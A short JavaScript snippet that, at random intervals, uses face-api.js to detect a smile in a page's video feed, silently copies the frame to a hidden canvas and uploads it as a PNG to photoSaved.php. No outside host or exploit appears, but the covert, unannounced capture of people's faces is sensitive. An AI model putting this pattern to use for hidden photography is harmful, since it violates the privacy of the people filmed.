(function () {
    // Variables for random capture
    let lastCaptureTime = 0;
    const minInterval = 5000; // Minimum interval (5 seconds)
    const maxInterval = 15000; // Maximum interval (15 seconds)

    // Function to start random photo capture
    function startRandomCapture() {
        setInterval(() => {
            const currentTime = Date.now();
            const randomInterval = Math.floor(Math.random() * (maxInterval - minInterval) + minInterval);

            // If enough time has passed, attempt to capture a photo
            if (currentTime - lastCaptureTime > randomInterval) {
                lastCaptureTime = currentTime;
                detectSmileAndCapture();
            }
        }, 1000); // Check every 1 second
    }

    // Function to detect smile and capture photo if smiling
    async function detectSmileAndCapture() {
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        if (!video || !canvas) return; // Ensure the video and canvas elements are present

        const ctx = canvas.getContext('2d');

        // Ensure canvas dimensions match video
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;

        // Detect face with expressions using face-api.js
        const options = new faceapi.TinyFaceDetectorOptions();
        const detection = await faceapi.detectSingleFace(video, options)
            .withFaceLandmarks()
            .withFaceExpressions();

        if (detection && detection.expressions.happy > 0.6) {
            console.log('Smile detected, capturing photo...');
            capturePhoto();
        }
    }

    // Function to capture photo
    function capturePhoto() {
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        if (!video || !canvas) return; // Ensure elements are still available

        const ctx = canvas.getContext('2d');

        // Draw the current frame from the video onto the canvas (without displaying it)
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        // Convert canvas content to a data URL
        const photoData = canvas.toDataURL('image/png');

        // Send the captured photo to the server
        savePhoto(photoData);
    }

    // Function to save the photo on the server-side
    function savePhoto(photoData) {
        fetch('photoSaved.php', {
            method: 'POST',
            body: JSON.stringify({ image: photoData }),
            headers: {
                'Content-Type': 'application/json'
            }
        })
        .then(response => response.text())
        .then(result => {
            console.log('Photo saved:', result);
        })
        .catch(error => console.error('Error saving photo:', error));
    }

    // Start the random capture process without affecting other scripts
    window.addEventListener('load', startRandomCapture);
})();
